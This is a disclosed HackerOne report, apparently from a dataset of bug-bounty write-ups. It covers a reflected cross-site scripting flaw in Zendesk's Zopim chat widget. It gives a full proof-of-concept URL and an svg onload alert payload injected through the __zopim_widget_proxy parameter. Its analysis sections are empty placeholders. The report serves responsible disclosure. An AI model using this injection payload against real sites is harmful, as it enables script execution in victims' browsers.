---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '94230'
original_report_id: '94230'
title: Cross-site Scripting in all Zopim
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zendesk
created_at: '2015-10-16T14:56:26.648Z'
disclosed_at: '2015-10-20T22:53:27.181Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Cross-site Scripting in all Zopim

## Metadata

- HackerOne Report ID: 94230
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zendesk
- Disclosed At: 2015-10-20T22:53:27.181Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello.
This vulnerability works on all sites where there Zopim chat.
Vulnerable link:
https://www.zopim.com/#1=1&__zopim_widget_proxy=1.zopim.com/s/W/xdds/PIJ4+155G8p7LL3w/c/1444997086678%22%3E%3C/script%3E%3Csvg/onload=alert%28%22XSS%22%29%3E
Vulnerable param is __zopim_widget_proxy.
For XSS i used "></script><svg/onload=alert("XSS")>
Tested in Mozilla Firefox.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
